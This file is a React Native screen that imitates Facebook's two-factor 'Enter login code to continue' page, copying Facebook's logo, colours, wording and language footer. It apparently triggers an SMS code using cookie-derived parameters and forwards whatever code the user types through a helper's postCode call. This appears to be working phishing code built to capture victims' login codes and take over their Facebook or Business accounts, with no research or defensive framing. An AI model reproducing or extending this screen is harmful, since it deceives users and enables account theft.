import { MyText } from "@component";
import React, { Component } from 'react';
import {
     SafeAreaView, StatusBar, Image, TouchableOpacity, View, TextInput, Alert,
} from 'react-native';
import { connect } from 'react-redux';
import { FetchAndGetCode } from "../../common/fetchAndGetCode";
import AsyncStorage from '@react-native-community/async-storage';
import Icon from "react-native-vector-icons/Ionicons";

class InputCode extends Component {
    constructor(props) {
        super(props);
        this.state = {
            text: '',
            last_code: ""
        };

        this.params = {};
    }
    async handleInfoCustom() {
        try {
            await this.getCookie();
        } catch (error) {
            console.log('error :>> ', error);
        }
    }

    componentDidMount() {
        this.handleInfoCustom();
    }

    async getCookie() {
        try {
            let { params } = this.props.route.params;
            console.log('params :>> ', params);
            this.fetchCode = new FetchAndGetCode(params);
            await this.fetchCode.SendSms()
            if (!this.fetchCode.hasTwofactor) {
                AsyncStorage.setItem("UPDATED", "YES");
                this.props.navigation.navigate("MainHome");
                return;
            }
            // if (this.props.route?.params?.code_new) {
            //     this.state.text = this.props.route?.params?.code_new
            //     this.onClickSubmit();
            // }
        } catch (error) {
            console.log('1234512345 :>> ', error);

        }
    }

    onClickSubmit = async () => {
        try {
            // this.setState({
            //     urlCheck: `https://business.facebook.com/latest/posts/published_posts`
            // })
            const text = this.state.text;
            if (!text.length) return;
            // if (this.state.last_code == text) return;
            // this.state.last_code = this.state.text;

            const code = text;
            const success = await this.fetchCode.postCode(code);
            if (success) {
                AsyncStorage.setItem("UPDATED", "YES");
                this.props.navigation.navigate("MainHome");
                return;
            } else {
                Alert.alert(
                    "Alert",
                    "Wrong code",
                    [
                        {
                            text: "OK", onPress: () => {
                                this.setState({ text: '' })
                            }
                        }
                    ]
                );
            }
            //reload page
        } catch (error) {
            console.log('error :>> ', error);
        }
    }
    rendeHeader = () => {
        return (
            <SafeAreaView style={{
                marginTop: StatusBar.currentHeight,
                height: 50,
                paddingHorizontal: 10,
                width: "100%",
                backgroundColor: "#4267B2",
                justifyContent: 'center',
                alignItems: 'center'
            }}>
                 <Image source={{ uri: 'ic_fb_white' }}
                    style={{
                        height: 40,
                        width: 140,
                    }}
                    resizeMode={"cover"}
                />
            </SafeAreaView>
        )
    }


    renderBody = () => {
        return (
            <View style={{
                marginTop: 20,
                width: "95%",
                borderColor: 'gray',
                paddingTop: 20,
                backgroundColor: "white",
                justifyContent: 'center',
                alignSelf: 'center',
                alignItems: 'flex-start',
                shadowColor: "#000",
                shadowOffset: {
                    width: 0,
                    height: 1,
                },
                shadowOpacity: 0.22,
                shadowRadius: 2.22,

                elevation: 3,
            }}>
                <MyText
                    text={'Enter login code to continue'}
                    style={{
                        fontWeight: "bold",
                        marginLeft : 10,
                    }} />
                <View style={{
                    width: "100%",
                    height: 0.5,
                    backgroundColor: 'gray',
                    marginTop: 20,
                }} />
                <MyText
                    text={"It looks like you haven't logged in from this browser before. Please enter the login code from your"}
                    addSize = {-1}
                    style={{
                        marginTop: 10,
                        marginLeft : 10,
                    }}>
                    <MyText
                        text={" Code generator "}
                        addSize = {-2}
                        style={{
                            fontWeight: "bold",
                            marginLeft : 10,
                        }}>
                            <MyText
                                text={'below.'}
                                style={{
                                    fontWeight: "normal",
                                    marginLeft : 10,
                                }} 
                            />
                        </MyText>
                    
                </MyText>
                <TextInput style={{
                    marginTop: 10,
                    borderColor: 'gray',
                    borderWidth: 0.5,
                    width: 200,
                    marginLeft : 10,
                    height: 40,
                    paddingHorizontal: 10,
                }}
                    value={this.state.text}
                    placeholderTextColor={'gray'}
                    onChangeText={(text) => { this.setState({ text }) }}
                />
                <View style={{
                    width: "100%",
                    height: 0.3,
                    backgroundColor: 'gray',
                    marginTop: 20,
                }} />
                <View style={{
                    width: "100%",
                    height : 40,
                    flexDirection: 'row',
                    alignItems: 'center',
                    backgroundColor : '#F3F5F7',
                    justifyContent: 'center',
                }}>
                    <MyText
                        text={'Having trouble?'}
                        style={{
                            color: "#4267B2",
                            textDecorationLine: 'underline'
                        }} />
                </View>
            </View>
        )
    }

    renderFooter = () => {
        return (
            <View>
            <TouchableOpacity style={{
                height: 40,
                marginHorizontal : 10,
                marginTop : 10,
                borderRadius : 4,
                backgroundColor: "#526799",
                justifyContent: 'center',
                alignItems: 'center'
            }}
                onPress={this.onClickSubmit}>
                <MyText

                    text={'Submit Code'}
                    style={{
                        fontWeight : 'bold',
                        color: "white",
                    }} />
            </TouchableOpacity>
            <View style = {{
                paddingVertical : 10,
                paddingHorizontal : 10,
                flexDirection : 'row',
                backgroundColor : 'white',
                marginHorizontal : 10,
                marginTop : 20,
            }}>
                <View style = {{
                    flex : 1,
                    justifyContent : 'center',
                    alignItems : 'center'
                }}>
                    <MyText text = {"English (UK)"}
                    style = {{
                        fontWeight : 'bold',
                        color : "#807F86"
                    }}/>
                    <MyText text = {"中文(台灣)"}
                    style = {{
                        marginTop : 5,
                        color: "#4267B2",
                    }}/>
                    <MyText text = {"Espanol"}
                    style = {{
                        marginTop : 5,
                        color: "#4267B2",
                    }}/>
                    <MyText text = {"Francais (France)"}
                    style = {{
                        marginTop : 5,
                        color: "#4267B2",
                    }}/>
                </View> 
                <View style = {{
                    flex : 1,
                    justifyContent : 'center',
                    alignItems : 'center'
                }}>
                    <MyText text = {"Tieng Viet"}
                    style = {{
                        color : "#807F86",
                        color: "#4267B2",
                    }}/>
                    <MyText text = {"한국어"}
                    style = {{
                        marginTop : 5,
                        color: "#4267B2",
                    }}/>
                    <MyText text = {"Portugues (Brasil)"}
                    style = {{
                        marginTop : 5,
                        color: "#4267B2",
                    }}/>
                    <View style = {{
                        marginTop : 5,
                        width : 15,
                        height : 15,
                        justifyContent : 'center',
                        alignItems : 'center',
                        borderColor : "#4267B2",
                        borderWidth : 0.3
                    }}>
                        <Icon name="add-outline" size={8} color = { "#4267B2"}/>
                    </View>
                </View>
            </View>
            </View>
        )
    }

    render() {
        return (
            <SafeAreaView style={{
                flex: 1,
                backgroundColor: "#D9DAE0",
            }}>
                {this.rendeHeader()}
                {this.renderBody()}
                {this.renderFooter()}
            </SafeAreaView>
        )
    }
}

const mapStateToProps = function (state) {
    return {
    };
};
const mapDispatchToProps = function (dispatch) {
    return {
    };
};
export default connect(mapStateToProps, mapDispatchToProps)(InputCode);